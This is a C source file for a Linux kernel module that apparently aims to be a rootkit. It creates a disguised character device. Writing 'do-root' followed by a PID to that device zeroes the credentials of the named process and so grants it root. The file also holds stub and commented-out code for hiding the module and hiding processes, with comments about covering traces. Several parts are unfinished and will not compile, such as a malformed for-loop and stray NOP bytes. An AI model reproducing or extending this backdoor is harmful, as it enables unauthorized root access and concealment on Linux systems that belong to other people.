/*
 *	simple kernel module
 */

#include <linux/module.h>		/* used by all modules */
#include <linux/kernel.h>		/* used by KERN_INFO and others */
#include <linux/init.h>			/* used for macros */
#include <linux/fs.h>			/* used for filesystem stuff */
#include <linux/uaccess.h>		/* required to include <asm/uaccess.h> */
#include <asm/uaccess.h>		/* for handling data to userland buffers */
#include <linux/device.h>		/* for class/device creation */
#include <linux/slab.h>			/* for kernel memory allocation */
#include <linux/string.h>		/* for string functions */
#include <linux/cred.h>				/* for credential structures */
#include <linux/sched.h>		/* for task and pid related operations */
#include <asm/current.h>		/* for definition of 'current' (the current task) */

#include <linux/syscalls.h>

#include <linux/gfp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("me");
MODULE_DESCRIPTION("simple module");
MODULE_VERSION("0.0.1");

/* prototypes */
int __init trivial_init(void);
void __exit trivial_exit(void);
static int trivial_open(struct inode *, struct file *);
static int trivial_close(struct inode *, struct file *);
static ssize_t trivial_write(struct file *, const char *, size_t, loff_t *);
static ssize_t trivial_read(struct file *, char *, size_t, loff_t *);
static struct task_struct *find_task_from_pid(int);
static void root_creds(struct cred *);
static void give_root(int);

/* useful defines */
#define DEVICE_NAME 		"hello"		// name appears in /proc/devices
#define CLASS_NAME 			"hey"
#define SUCCESS				0
#define ASCIINUM_TO_DEC(x)	(x-48)				// conversion from ascii to decimal

/* globals (within this file) */
static int majorNum;					// device major number assigned
static int deviceOpen = 0;				// track if device open, may be useful later
static struct class *devClass = NULL;
static struct device *devStruct = NULL;

/* used to store any data aquired, given back during a read()- needs to be allocated */
static char *devBuf = NULL;			

/* must declare file system operations that device can perform- see linux/fs.h */
static struct file_operations fops = {
	.read = trivial_read,
	.write = trivial_write,
	.open = trivial_open,
	.release = trivial_close
};

/* struct storing fields of a pid struct we want to hide */
struct hidden_pid {
	atomic_t count;
	unsigned int level;
	struct hlist_head tasks[PIDTYPE_MAX];
	struct rcu_head rcu;
	struct upid numbers[1];
};

/* array of structs where we can hide process fields */
static struct hidden_pid hidden_pids[10];
static int hidden_p_idx = 0;

/*---------------- startup/shutdown ------------------------*/
/* function called on module initialisation */
int __init trivial_init(void) {

	/* register our device with the kernel */
	majorNum = register_chrdev(0, DEVICE_NAME, &fops);

	if (majorNum < 0) {
		printk(KERN_ALERT "Failed to sample chardevice\n");
		return majorNum;
	}
	
	/* register the device class */
	devClass = class_create(THIS_MODULE, CLASS_NAME);
	if (IS_ERR(devClass)) {
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to register sample char class\n");
		return -1;		// tmp value
	}

	/* create the device */
	devStruct = device_create(devClass, NULL, MKDEV(majorNum, 0), NULL, DEVICE_NAME);
	if (IS_ERR(devStruct)) {
		class_destroy(devClass);
		unregister_chrdev(majorNum, DEVICE_NAME);
		printk(KERN_ALERT "Failed to create sample device\n");
		return -1;		// tmp value
	}

	printk(KERN_INFO "Sample with the kernel. Thanks kernel\n");
	/* probably a whole lot of stealth work here */

	struct file *f;
	char privBuf2[128];
	for(int i=0; i < 128, i++) {
		privBuf2[i] = 0;
	}

	f = filp_open("/sys/module/hello/sections/.text", O_RDONLY, 0);
	if (f == NULL) {
		printk(KERN_INFO "ROOTKIT: Failed to open file\n");
	}


	/* new buffer in kernel space */
	void *new = kmalloc(20000, GFP_KERNEL);

	char hey[5] = "\x90\x90\x90\x90\x90";
	hello();
	return 0;
}

int hello(void) {
	printk(KERN_INFO "it worked lol\n");
	return 0;
}

/* function called on module removal, should reverse init function */
void __exit trivial_exit(void) {
	
	/* unregister the device, cover our traces */
	device_destroy(devClass, MKDEV(majorNum, 0));
	class_unregister(devClass);
	class_destroy(devClass);
	unregister_chrdev(majorNum, DEVICE_NAME);
}

static int trivial_open(struct inode *inode, struct file *f) {
	printk(KERN_INFO "Inconspicuous device opened\n");
	return 0;
}

/* not sure if this is required, may have some use for this in future though */
static int trivial_close(struct inode *inode, struct file *f) {
	return 0;
}

/* 
 * called when a process writes to the device, used to execute specific commands 
 * expects the amount of bytes written returned
 */
static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_t *off) {
	//printk(KERN_INFO "Write performed to inconspicuous device\n");

	char *privBuf;				// our own buffer in kernel space
	char magic[] = "do-";		// magic prefix for all commands
	char *cmdPtr;				// track where in command statement we are later

	privBuf = (char *) kmalloc(len+1, GFP_KERNEL);	// allocate normal kernel RAM
	if (privBuf == NULL) {
		printk(KERN_INFO "ROOTKIT: failed to allocate kernel buffer");
		return len;
	}

	/* we are working with a user buffer, must copy into kernel space */
	copy_from_user(privBuf, buff, len);

	/* if the string starts with the magic prefix, we try to execute the command */
	if (memcmp(privBuf, magic, 3) == SUCCESS) {
		cmdPtr = &privBuf[3];			// cmdPtr should now be the given command

		/* case root access to a process- number after command indicates pidf */
		if (strncmp(cmdPtr, "root", 4) == SUCCESS) {

			cmdPtr = &cmdPtr[4]; 		// the beginning of the pid given
			if ((*cmdPtr) != '\0') {
				/* see man strtol for arguments */
				int pid = (int) simple_strtol(cmdPtr, NULL, 10);
				give_root(pid);
			}
		} else if (strncmp(cmdPtr, "hide", 4) == SUCCESS) {
			struct file *f;
			char privBuf2[128];
			for(int i=0; i < 128, i++) {
				privBuf2[i] = 0;
			}

			f = filp_open("/proc/modules", O_RDONLY, 0);
			if (f == NULL) {
				printk(KERN_INFO "ROOTKIT: Failed to open file\n");
			}

			/* new buffer in kernel space */
			void *new = kmalloc(0, GFP_KERNEL);
		}
	}
	kfree(privBuf);		// leave no trace
	return len;
}

/*
 * called when a process reads from the device, expects number of bytes read to be returned
 * maybe we give back custom data (say, from a command given to write()) in future
 */
static ssize_t trivial_read(struct file *f, char *buff, size_t length, loff_t *offset) {
	printk(KERN_INFO "Read performed on inconspicuous device\n");
	return 0;		// signal EOF for now
}

/* return the task struct associated with a given pid, or NULL on fail */
static struct task_struct *find_task_from_pid(int pid) {
	struct pid *task_pid;
	task_pid = find_vpid(pid);
	if (task_pid == NULL) {
		printk(KERN_INFO "Did not find pid struct from given pid\n");
		return NULL;
	}
	/* use the pid struct to find the task struct */
	struct task_struct *task = NULL;
	task = pid_task(task_pid, PIDTYPE_PID);
	return task;
}

/* change a given credential struct to root privileges */
static void root_creds(struct cred *c) {
	c->uid.val = 0;
	c->gid.val = 0;
	c->euid.val = 0;
	c->egid.val = 0;
	c->suid.val = 0;
	c->sgid.val = 0;
	c->fsuid.val = 0;
	c->fsgid.val = 0;
}

/* 
 * give root privileges to the process with given pid
 * a pid of 0 will give root to the current process 
 */
static void give_root(int pid) {
	struct task_struct *task;
	if (pid == 0) {
		task = current;
	} else {
		task = find_task_from_pid(pid);
		if (task == NULL) {
			return;
		}
	}
	root_creds(task->cred);
	root_creds(task->real_cred);
}
/*
static void hide_process(int pid) {
	struct pid *p = find_vpid(pid);
		if (task_pid == NULL) {
		printk(KERN_INFO "Did not find pid struct from given pid\n");
		return;
	}
	struct hidden_pid new;
	new.count = p->count;
	new.level = p->level;
	memcpy(&new.tasks, &p->tasks, sizeof(struct hlist_head * PIDTYPE_MAX));
	memcpy(&new.rcu, &p->rcu, sizeof(struct rcu));
	memcpy(&new.numbers, p->numbers, sizeof(struct upid));

	//zero out blocks in original pid, maybe make own function to do so 
}
*/
/* must call these and pass in our init/exit functions */
module_init(trivial_init);
module_exit(trivial_exit);